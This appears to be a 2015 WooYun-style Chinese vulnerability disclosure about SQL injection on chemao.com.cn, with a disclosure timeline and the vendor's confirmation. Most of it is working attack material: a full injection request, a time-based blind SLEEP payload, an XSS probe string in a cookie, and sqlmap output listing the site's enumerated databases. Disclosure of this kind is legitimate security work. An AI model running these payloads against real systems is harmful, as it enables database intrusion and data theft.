wybug_author: 天地不仁 以万物为刍狗
wybug_detail:
漏洞详情 披露状态：   									2015-08-14：	细节已通知厂商并且等待厂商处理中									2015-08-14：	厂商已经确认，细节仅向厂商公开									2015-08-24：	细节向核心白帽子及相关领域专家公开									2015-09-03：	细节向普通白帽子公开									2015-09-13：	细节向实习白帽子公开									2015-09-28：	细节向公众公开  简要描述： 一刀穷，一刀富，一刀穿麻布；疯子卖，疯子买，还有疯子在等待。 详细说明：  POST注入包：
POST /index.php?act=check_user_name&app=login HTTP/1.1X-Forwarded-For: 8.8.8.8'Content-Length: 61Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.chemao.com.cn:80/Cookie: uuid=b9ad9df8d8dd325339174aa1c7eef1c6; FC_ID=4c14a67618882c6c51b1bc4a1ad0173f439a360a; globalCookieCity=%A5%BF%CB%C0%AD%C0%AD%CF%D8%C9%BD%BE%B0; redirectURL=%252Findex.php%253Fapp%253De404; _jzqa=1.2755905335876263400.1439535130.1439535130.1439535130.1; _jzqc=1; _jzqx=1.1439535130.1439535130.1.jzqsr=acunetix-referrer%2Ecom|jzqct=/javascript:domxssexecutionsink(0,"'\"><xsstag>()refdxss").-; _jzqckmp=1; _jzqb=1.1.10.1439535130.0; sguid=%7B%22_type_%22%3A%22string%22%2C%22_val_%22%3A%22104513dd-11f6-1e42-1bb2-13f212221392%22%7D; sgpth=%7B%22_type_%22%3A%22string%22%2C%22_val_%22%3A%22%22%7D; _hjIncludedInSample=0; _hjUserId=40edcbea-299f-4f53-b8e6-f311b901d9b6; searchCookie=%5B%22e%22%5D; BAIDUID=911B765CFD7234AAAA0C4C0C9891B11B:FG=1; captcha=2f7rHost: www.chemao.com.cnConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*username=-1
username可注入




(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 68 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: username=-1' OR 3 AND (SELECT * FROM (SELECT(SLEEP(5)))fRqI)-- gCQq21=6 AND 000904=000904 -----[16:10:07] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[16:10:07] [INFO] fetching database names[16:10:07] [INFO] fetching number of databases[16:10:07] [INFO] resumed: 13[16:10:07] [INFO] resuming partial value: inform[16:10:07] [INFO] retrieved:[16:10:07] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsation_schema[16:14:47] [INFO] retrieved: 365eche_apptest[16:20:57] [INFO] retrieved: 365[16:22:41] [ERROR] invalid character detected. retrying..eche_online[16:27:13] [INFO] retrieved: 365eche_online_bak[16:34:08] [INFO] retrieved: 365eche_online_v_1_2[16:42:03] [INFO] retrieved: 365eche_pre[16:46:31] [INFO] retrieved: 365eche_pre_bak1[16:52:25] [INFO] retrieved: 365eche_pre_bak2[16:58:23] [INFO] retrieved: 365eche_pre_bak3[17:04:19] [INFO] retrieved: fifa2014_online[17:10:08] [INFO] retrieved: mysql[17:12:08] [INFO] retrieved: operation_online[17:18:54] [INFO] retrieved: wordpressavailable databases [13]:[*] `365eche_apptest`[*] `365eche_online_bak`[*] `365eche_online_v_1_2`[*] `365eche_online`[*] `365eche_pre_bak1`[*] `365eche_pre_bak2`[*] `365eche_pre_bak3`[*] `365eche_pre`[*] fifa2014_online[*] information_schema[*] mysql[*] operation_online[*] wordpress[17:22:47] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 49 times[17:22:47] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.chemao.com.cn'[*] shutting down at 17:22:47

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-08-14 19:05 厂商回复： 漏洞很严重，感谢善意提醒，程序框架里面存在bug，修复中。 最新状态： 暂无
